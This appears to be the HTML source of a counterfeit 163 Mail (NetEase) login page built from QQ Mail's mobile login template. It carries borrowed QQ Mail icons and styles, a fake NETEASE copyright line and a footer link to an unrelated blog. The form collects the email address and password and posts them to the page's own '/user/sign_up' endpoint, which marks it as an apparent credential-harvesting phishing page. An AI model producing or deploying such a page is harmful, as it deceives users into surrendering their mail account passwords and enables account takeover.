<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
<title>163邮箱</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="format-detection" content="telephone=no" />
<link rel="stylesheet" type="text/css" href="/static/css/wap.css" />
<!--[if lt IE 10]>
<script>
(function() {
var a = ['header','footer','section','aside','article','nav','hgroup','figure','figcaption','time','mark','output','meter'];
for(var i = 0, m = a.length; i < m; i++) {document.createElement(a[i]);}
})();
</script>
<link rel="stylesheet" type="text/css" href="https://res.mail.qq.com/wapmail/zh_CN/htmledition/style/mobile/wap_ie21b7d5.css" />
<![endif]-->
<link rel="icon" type="image/png" sizes="16x16" href="/static/img/qqmail_favicon_16h.png" />
<link rel="icon" type="image/png" sizes="32x32" href="/static/img/qqmail_favicon_32h.png" />
<link rel="icon" type="image/png" sizes="48x48" href="/static/img/qqmail_favicon_48h.png" />
<link rel="icon" type="image/png" sizes="96x96" href="/static/img/qqmail_favicon_96h.png" />
<link rel="apple-touch-icon-precomposed" href="/static/img/qqmail_logo_ios_60h.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/static/img/qqmail_logo_ios_114h.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/static/img/qqmail_logo_ios_120h.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/static/img/qqmail_logo_ios_152h.png" />
<script src="http://cdn.bootcss.com/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/user.js"></script>
</head>
<body class="login">
<div class="login_page">
<div id="nv" class="login_logo">登录QQ邮箱</div>
<div id="qlogin" class="qlogin"></div>    
<div class="login_form" id="web_login">
<form id="loginform" class="qm_form" onsubmit="return yz();" method="post" name="loginform" target="_self" autocomplete="on" action="/user/sign_up">
<input type="hidden" name="device" value="" />
<input type="hidden" value="1426308811" name="ts" id="ts"/>
<input type="hidden" value="" name="p" id="p"/>
<input type="hidden" name="f" value="xhtml" />
<input type="hidden" name="delegate_url" value="" />
<input type="hidden" name="action" value="" />
<input type="hidden" name="https" value="true" />
<input type="hidden" name="tfcont" value=""/> 
<div id="validcodeMsg"  style="display:none;" class="login_tips qm_tips qm_tips_ErrorInfo">
您填写的帐号或密码不正确
</div>
<div class="login_item_TextInput qm_form_item">
<div class="qm_form_item_cnt">
<input type="text" placeholder="163邮箱" autocomplete name="uin" size="10" id="uin" onblur="autoComplete(this);" class="qm_formText qm_formText_Input qm_formText_Input_Large" value="" /> 
</div>
</div>
<div class="qm_form_item login_item_TextInput">
<div class="qm_form_item_cnt">
<input type="password" name="pwd" id="pwd" size="10" class="qm_formText qm_formText_Input qm_formText_Input_Large" placeholder="163密码"  value="" autocomplete="off" />
</div>
</div>
<div class="login_item_Chkb qm_form_item">
<div class="qm_form_item_cnt">
<input type="checkbox" id="remember_obj" class="qm_chkb" name="mss" value="1" checked="true"/>
<label for="remember_obj">记住登录状态</label>
</div>
</div>
<div class="qm_form_item login_item_Submit">
<div class="qm_form_item_cnt">
<input type="submit" value=" 登录 " name="btlogin" class="qm_btn qm_btn_Large qm_btn_Blue login_submit" id="submitBtn" />
</div>
</div>
</form>    
</div>
<div style="display:none;" id="switch" class="lineright" onmouseup="QMLogin.switchMode()">
</div>
</div>
<div class="func_growSpace"></div>
<div class="login_footer">
<div class="link_qymail">
<a href="http://hexianren007.com/" target="_blank">鹤仔博客</a>
</div>
<p class="qm_copyright func_textGray">Copyright &copy; <?php echo date('Y'); ?> NETEASE Inc. All Rights Reserved.</p>
</div>
<script>
function autoComplete(_aoTarget)
{
if (_aoTarget && _aoTarget.value && _aoTarget.value.indexOf("@") == -1)
{
_aoTarget.value += "@163.com";
}
}
autoComplete(document.getElementById("uin"));
document.getElementById("uin") && document.getElementById("uin").focus();
</script>
<script type="text/javascript">
(function() {
var ie7AndLaterTips = document.createElement("div");
ie7AndLaterTips.style.cssText = "position: absolute;z-index: 4;top: 0;left: 0;width: 100%;height: 100%;background-color: #f5f5f5;";
ie7AndLaterTips.innerHTML = '<div style="position: absolute;top: 200px;left: 50%;width: 360px;height: 200px;margin-left: -270px;padding: 0 90px;overflow: hidden;border: 1px solid #e3e3e3;background-color: #fff;line-height: 26px;text-align: center;font-size: 16px;"><img src="http://mail.qq.com/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_27h_png8.png" style="width: 140px;height: 27px;line-height: normal;margin: 45px 0 15px;border: 0;"><br />因为你的浏览器版本太低，暂时无法访问此页面，建议你升级浏览器。<input type="text" id="ie7AndLaterInputFocus" style="position: absolute;top: -9999px;" /></div>';
if (window.navigator.appName == "Microsoft Internet Explorer" && !document.documentMode) { 
document.body.appendChild(ie7AndLaterTips);
document.body.style.overflow = "hidden";
document.getElementById("ie7AndLaterInputFocus").focus();
}
})();
</script>
</body>
</html>